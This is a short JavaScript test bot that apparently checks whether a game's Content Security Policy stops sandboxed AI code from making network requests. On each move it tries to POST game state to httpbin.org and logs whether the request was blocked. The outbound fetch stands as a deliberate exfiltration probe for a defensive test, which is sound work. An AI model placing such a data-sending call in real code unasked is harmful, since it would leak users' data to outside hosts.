// CSP test AI — attempts a fetch() on every move and logs whether it was blocked.
// Expected result with CSP active: fetch throws or is blocked, console shows
// "CSP BLOCKED" in the worker's console (visible in browser DevTools > Sources > worker).
// If CSP is NOT active: you'll see a network request in the DevTools Network tab.

function getBestMove(bot, pendingGarbage) {
  // Attempt to exfiltrate data — should be blocked by connect-src 'none'
  try {
    fetch('https://httpbin.org/post', {
      method: 'POST',
      body: JSON.stringify({ test: 'csp-check', lines: bot.lines }),
    }).then(() => {
      console.log('CSP FAILED — fetch succeeded, network request went through!');
    }).catch((err) => {
      console.log('CSP BLOCKED — fetch rejected:', err.message);
    });
  } catch (err) {
    console.log('CSP BLOCKED — fetch threw synchronously:', err.message);
  }

  // Return a valid (dumb) move so the game doesn't break
  return { rotationIndex: 0, x: 4, y: 0, useHold: false };
}
